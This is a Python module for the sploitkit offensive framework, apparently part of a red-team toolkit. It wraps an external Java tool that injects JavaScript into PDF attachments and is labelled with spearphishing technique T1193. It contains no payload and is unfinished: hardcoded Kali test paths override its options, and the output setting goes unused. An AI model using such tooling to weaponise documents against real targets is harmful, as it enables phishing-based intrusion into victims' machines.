from sploitkit import *
import os
import subprocess
#from procedure import Procedure
from termcolor import colored

path = os.path.dirname(os.path.realpath(__file__))
cwd = os.getcwd()
main_path = path.split('/')

class JS2PDFInjection(Module):
	""" Module used to inject javascript code into a PDF file. ID: T1193	

	Author:  your name (your email)
	Version: 1.0
	"""

	groups				= ['']	#Groups who have used this technique
	tactic  			= ''	#Tactic this technique belongs to
	techniqueId 		= ''	#Id of the Technique
	techniqueName 		= ''	#Name of the technique
	sub_techiniques 	= []	#Subtechniques of this technique 

	#self.groups = ['saguaro']
	#self.tactic = 'Initial Access'
	#self.techniqueID = 'T1566.001'

	#MODULE OPTIONS
	config  = Config({
	        Option(
	            'ATTACHMENT',
	            "PDF File to be injected with JS code",
	            True,
	            set_callback=lambda o: o.root._set_app_folder(),
	        ): "~/.{appname}",
	        Option(
	            'JS_Code',
	            "Javascript Code that will be injected into the attachment",
	            True,
	            #set_callback=lambda o: o.root._set_logging(o.value),
	        ): "~/.{appname}",
	        Option(
	            'OUTPUT',
	            "Output file path (optional)",
	            False,
	            #set_callback=lambda o: o.root._set_logging(o.value),
	        ): " ",
	    })


	def run(self):
		attachment = ''.join(list(self.config.get('ATTACHMENT')))
		js = ''.join(list(self.config.get('JS_Code')))
		out = ''.join(list(self.config.get('OUTPUT')))


		#TEST ARGUMENTS
		attachment = "/home/kali/AE-temp/Prueba/inputs/plan2021.pdf"
		js = "/home/kali/AE-temp/Prueba/inputs/test.js"
		out = "/home/kali/AE-temp/Prueba/inputs/"


		print(colored('[+]','green'),'ARCHIVO: '+ attachment)
		print(colored('[+]','green'),'CODIGO JS: '+ js)
		print(colored('[+]','green'),'Archivo guardado en: '+ out)
		subprocess.call(['java','-jar',cwd+'/lib/bin/aux/JS2PDFInjector/JS2PDFInjector-1.0.jar',attachment,js],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)






		
